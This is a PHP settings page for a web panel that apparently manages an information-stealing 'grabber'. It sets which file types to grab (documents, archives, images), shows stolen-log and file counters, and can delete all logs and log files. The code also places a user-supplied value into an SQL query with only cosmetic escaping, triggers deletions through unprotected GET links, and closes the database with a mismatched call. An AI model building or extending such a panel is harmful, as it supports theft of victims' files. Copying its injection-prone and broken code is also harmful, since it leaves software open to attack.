<?php
/*
	Settings Page
*/

$pageName = "Settings";

session_start();
error_reporting(0);

require("app/config.php");

if($config["db_server"] == null)
{
	header('Location: http://'. $_SERVER["HTTP_HOST"] .'/install');
	exit(0);
}

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["server_addr"] .'/auth', true, 301 );
	exit(0);
}

$grub_files = checkParam($_POST["grub_files"]);

$type = checkParam($_GET["type"]);

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	if($type != null)
	{
		switch($type)
		{
			case 'CLEAR_STATS':
				$database->query("UPDATE `stats` SET `Value`='0' WHERE `Name`='all_logs'");
				$database->query("UPDATE `stats` SET `Value`='0' WHERE `Name`='all_files'");
				$database->query("UPDATE `stats` SET `Value`='0' WHERE `Name`='errors'");
				break;
				
			case 'DELETE_ALL_LOGS':
				$database->query("UPDATE `stats` SET `Value`='0' WHERE `Name`='all_logs'");
				$database->query("UPDATE `stats` SET `Value`='0' WHERE `Name`='all_files'");
				$database->query("UPDATE `stats` SET `Value`='0' WHERE `Name`='errors'");
				$database->query("DELETE FROM `logs`");
				
				if (file_exists('server/'. $config["logs_folder"] .'/'))
				{
					foreach (glob('server/'. $config["logs_folder"] .'/*') as $file)
					{
						unlink($file);
					}
				}
				
				break;
		}
	}
	
	if($grub_files != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$grub_files' WHERE `Name`='grub_files';");
	}
	
	$_grub_files = $database->query("SELECT * FROM `settings` WHERE `Name`='grub_files';")->fetch_array();
}
	
function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

require("template/header.tmpl.php");
?>
	<div class="container">
	<div class="row">
                <div class="col-xl-3 u-hidden-down@wide">
                    <aside class="c-menu u-ml-medium">
                       
                    </aside>
                </div>

                <div class="col-md-7 col-xl-6">
                    <main>
					<form id="settings" action="/settings" method="POST">
					
                        <h2 class="u-h3 u-mb-small">Settings</h2>

                        <div class="c-card u-p-medium u-text-small u-mb-small">
						
                            <h6 class="u-text-bold">MySQL Info</h6>

                            <dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">MySQL Status</dt>
								<?
								
								if($database)
								{
									?><dd style="color:green">Connected</dd><?
								}
								else
								{
									?><dd style="color:red">Can't connect to DB.</dd><?
								}
								
								?>
                            </dl>

                            <dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">Server</dt>
                                <dd><? echo $config["db_server"]; ?></dd>
                            </dl>
							
							<dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">User</dt>
                                <dd><? echo $config["db_user"]; ?></dd>
                            </dl>
							
							<dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">Database</dt>
                                <dd><? echo $config["db_name"]; ?></dd>
                            </dl>
							
							<br>
							<i>Edit app/config.php to change this params.</i>
							
                        </div>
						
						<div class="c-card u-p-medium u-text-small u-mb-small">
						
                            <h6 class="u-text-bold">Grub Settings</h6>

                            <dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">File formats</dt>
                                <dd>
									<div class="c-field">
										<input class="c-input" id="grub_files" name="grub_files" style="width: 380px; margin-top:-9px;" type="text" placeholder="txt;doc;docx;log;rar;zip;7z;jpeg;jpg;png;bmp;" value="<? if($database) { echo $_grub_files["Value"]; } ?>">
									</div>
								</dd>
                            </dl>
							
                        </div>

						
						<div class="col u-mb-medium" style="/* width:200px; */margin-right: 50%;">
							<a onclick="document.getElementById('settings').submit(); return false;" class="c-btn c-btn--success c-btn--fullwidth">Save</a>
							<a class="c-btn c-btn--danger" href="/settings?type=CLEAR_STATS" style="margin-top: 16px;width: 100%;">Clear stats</a>
							<a class="c-btn c-btn--danger" href="/settings?type=DELETE_ALL_LOGS" style="margin-top: 16px;width: 100%;">Delete ALL logs</a>
						</div>
						
					</form>
                    </main>
                </div>
				
            </div>
        </div>
		<script src="js/main.min.js?v=1.4"></script>
    </body>
</html>
<? mysql_close($database); ?>